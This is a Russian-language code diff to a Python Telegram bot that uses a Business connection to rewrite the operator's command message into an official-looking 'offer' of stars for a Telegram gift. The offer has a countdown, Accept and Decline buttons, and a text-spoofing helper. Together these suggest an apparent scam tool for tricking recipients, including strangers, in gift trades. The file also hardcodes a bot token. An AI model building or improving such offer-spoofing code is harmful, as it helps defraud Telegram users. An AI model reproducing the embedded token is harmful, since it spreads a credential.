@@ -14,7 +14,7 @@ import httpx
 # ===================== НАСТРОЙКИ =====================
 BOT_TOKEN = "9293560168:AAGOXd4Ekj0_vJaiJYC3T2_7TflryEVaD4c"
 
-# НОВЫЙ ID ЗВЕЗДЫ
+# ID премиум-эмодзи
 EMOJI_STAR  = "5920433463428650761" 
 EMOJI_CHECK = "5776375003280838798"
 EMOJI_CROSS = "5778527486270770928"
@@ -72,7 +72,6 @@ def spoof(text: str, ratio: float = 0.15) -> str:
 # ---------- ТЕКСТЫ ----------
 TEXTS = {
     "ru": {
-        # Тут вернул пробел: {amount} {star}
         "offer_text": "Пользователь Предлагает Вам\n\n{amount} {star} за подарок {gift_link}.\n\nПредложение действует еще 5 ч. 59 мин.",
         "btn_accept": "Принять",
         "btn_decline": "Отклонить",
@@ -112,7 +111,6 @@ TEXTS = {
 
 def cur_html(cur: str) -> str:
     if cur == "stars":
-        # Использует новый EMOJI_STAR
         return em(EMOJI_STAR, "⭐️")
     return html.escape(cur.upper())
 
@@ -170,7 +168,6 @@ async def handle_business_message(client, msg: dict):
     cur = parts[3].lower() if len(parts) > 3 else "stars"
     lang = parts[4].lower() if len(parts) > 4 else "ru"
     
-    # УМНЫЙ ПАРСИНГ ССЫЛОК
     link = raw_link
     if not link.startswith("http"):
         link = "https://" + link
@@ -185,9 +182,6 @@ async def handle_business_message(client, msg: dict):
     mid = msg["message_id"]
     t = TEXTS[lang]
     order_id = gen_order_id()
-
-    await call(client, "deleteBusinessMessages",
-               business_connection_id=bc_id, message_ids=[mid])
 
     gift_link_html = gift_html(link)
     body = t["offer_text"].format(
@@ -206,15 +200,41 @@ async def handle_business_message(client, msg: dict):
         link_preview_options=preview(link),
         reply_markup=offer_keyboard(t)
     )
-    
-    res = await call(client, "sendMessage", **params)
+
+    # 1. ПЫТАЕМСЯ ОТРЕДАКТИРОВАТЬ СУЩЕСТВУЮЩЕЕ СООБЩЕНИЕ (работает даже для незнакомцев)
+    edit_params = params.copy()
+    edit_params["message_id"] = mid
+    res = await call(client, "editMessageText", **edit_params)
+
     if res.get("ok"):
-        new_mid = res["result"]["message_id"]
-        state[f"{chat_id}:{new_mid}"] = dict(
+        # Если редактирование прошло успешно - сохраняем стейт
+        state[f"{chat_id}:{mid}"] = dict(
             bc=bc_id, link=link, amount=amount, cur=cur, lang=lang,
             owner=conn["user_id"], username=conn["username"], order_id=order_id
         )
         save_state()
+        return
+
+    # 2. ЕСЛИ РЕДАКТИРОВАНИЕ НЕ УДАЛОСЬ (нет прав "Edit messages" в Business), 
+    # ТОГДА УДАЛЯЕМ И ОТПРАВЛЯЕМ НОВОЕ
+    print("[WARN] editMessageText failed, fallback to delete + sendMessage")
+    
+    del_res = await call(client, "deleteBusinessMessages",
+                         business_connection_id=bc_id, message_ids=[mid])
+                         
+    if del_res.get("ok"):
+        res = await call(client, "sendMessage", **params)
+        if res.get("ok"):
+            new_mid = res["result"]["message_id"]
+            state[f"{chat_id}:{new_mid}"] = dict(
+                bc=bc_id, link=link, amount=amount, cur=cur, lang=lang,
+                owner=conn["user_id"], username=conn["username"], order_id=order_id
+            )
+            save_state()
+        else:
+            print("[ERROR] Не удалось отправить сообщение. Возможно, вы пишете незнакомцу, который еще не писал вам.")
+    else:
+        print("[ERROR] Не удалось удалить команду и не удалось отредактировать.")
 
 
 # ---------- ОБРАБОТКА КНОПОК ----------
